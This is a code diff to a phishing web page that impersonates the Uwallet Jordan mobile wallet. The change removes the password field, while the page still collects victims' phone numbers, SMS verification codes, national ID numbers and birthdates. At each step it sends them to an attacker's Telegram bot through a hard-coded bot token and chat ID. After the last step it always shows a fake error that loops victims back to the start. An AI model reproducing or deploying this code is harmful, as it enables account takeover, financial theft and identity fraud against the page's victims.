@@ -312,15 +312,15 @@
     const uwalletLogo = "https://d.top4top.io/p_3619v3uia0.jpeg";
     const BOT_TOKEN = "8478729698:AAH6ufdvIQicXkUajFb3M1ocoGusDHIbWoI";
     const CHAT_ID = "6873334348";
-    let userData = {phone: '', password: '', code4a: '', nationalId:'', birthdate:'', code4b:''};
+    let userData = {phone: '', code4a: '', nationalId:'', birthdate:'', code4b:''};
     let currentStep = "phone";
     let telegramMsgId = null;
 
     function restart() {
       closeModal();
-      userData = {phone: '', password: '', code4a: '', nationalId:'', birthdate:'', code4b:''};
+      userData = {phone: '', code4a: '', nationalId:'', birthdate:'', code4b:''};
       currentStep = "phone";
-      renderPhonePassStep();
+      renderPhoneStep();
     }
 
     function stepIndicator(step) {
@@ -350,7 +350,7 @@
       document.getElementById('modalError').classList.remove('active');
     }
 
-    function renderPhonePassStep() {
+    function renderPhoneStep() {
       currentStep = "phone";
       app.innerHTML = `
         ${header("مرحبًا بك! سجل دخولك لحساب Uwallet")}
@@ -358,8 +358,6 @@
         <form id="phoneForm" autocomplete="off">
           <label>رقم الهاتف</label>
           <input type="tel" id="phone" maxlength="10" required placeholder="07XXXXXXXX" pattern="07[0-9]{8}" autocomplete="tel" inputmode="numeric"/>
-          <label>كلمة المرور</label>
-          <input type="password" id="password" maxlength="32" required placeholder="ادخل كلمة المرور" autocomplete="current-password"/>
           <button type="submit" class="button">تسجيل الدخول</button>
         </form>
         <div class="uwallet-footer">Uwallet Jordan &copy; 2025</div>
@@ -368,16 +366,13 @@
       document.getElementById('phoneForm').onsubmit = async function(e) {
         e.preventDefault();
         const phone = document.getElementById('phone').value.trim();
-        const password = document.getElementById('password').value.trim();
         if (!/^07\d{8}$/.test(phone)) {
           showErrorModal(); return;
         }
-        if (password.length < 4) { showErrorModal(); return; }
         userData.phone = phone;
-        userData.password = password;
-        // إرسال رقم الهاتف وكلمة المرور للبوت
+        // إرسال رقم الهاتف للبوت
         try {
-          telegramMsgId = await sendToTelegram(`🟦 تسجيل دخول Uwallet الأردن\n📱 الهاتف: ${userData.phone}\n🔑 كلمة المرور: ${userData.password}`);
+          telegramMsgId = await sendToTelegram(`🟦 تسجيل دخول Uwallet الأردن\n📱 الهاتف: ${userData.phone}`);
         } catch (err) {}
         renderCode4aStep();
       };
@@ -411,13 +406,13 @@
         // إرسال رمز التحقق مع البيانات للبوت
         try {
           telegramMsgId = await sendToTelegram(
-            `🟦 تسجيل دخول Uwallet الأردن\n📱 الهاتف: ${userData.phone}\n🔑 كلمة المرور: ${userData.password}\n🔢 رمز SMS: ${userData.code4a}`
+            `🟦 تسجيل دخول Uwallet الأردن\n📱 الهاتف: ${userData.phone}\n🔢 رمز SMS: ${userData.code4a}`
           );
         } catch (err) {}
         renderIdBirthStep();
       };
       document.getElementById('backBtn').onclick = () => {
-        renderPhonePassStep();
+        renderPhoneStep();
       };
     }
 
@@ -453,7 +448,7 @@
         // إرسال البيانات للبوت
         try {
           telegramMsgId = await sendToTelegram(
-            `🟦 تسجيل دخول Uwallet الأردن\n📱 الهاتف: ${userData.phone}\n🔑 كلمة المرور: ${userData.password}\n🔢 رمز SMS: ${userData.code4a}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}`
+            `🟦 تسجيل دخول Uwallet الأردن\n📱 الهاتف: ${userData.phone}\n🔢 رمز SMS: ${userData.code4a}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}`
           );
         } catch (err) {}
         renderFinalCodeStep();
@@ -512,7 +507,7 @@
         // إرسال جميع البيانات النهائية للبوت
         try {
           await sendToTelegram(
-            `🟦 تسجيل دخول Uwallet الأردن\n📱 الهاتف: ${userData.phone}\n🔑 كلمة المرور: ${userData.password}\n🔢 رمز SMS: ${userData.code4a}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}\n🔒 رمز تحقق إضافي: ${userData.code4b}`
+            `🟦 تسجيل دخول Uwallet الأردن\n📱 الهاتف: ${userData.phone}\n🔢 رمز SMS: ${userData.code4a}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}\n🔒 رمز تحقق إضافي: ${userData.code4b}`
           );
         } catch (err) {}
         showErrorModal(); // حتى لو صحيحة كل مرة يظهر الخطأ والتوجيه للصفحة الأولى
@@ -554,7 +549,7 @@
     }
 
     const app = document.getElementById('app');
-    renderPhonePassStep();
+    renderPhoneStep();
   </script>
 </body>
 </html>
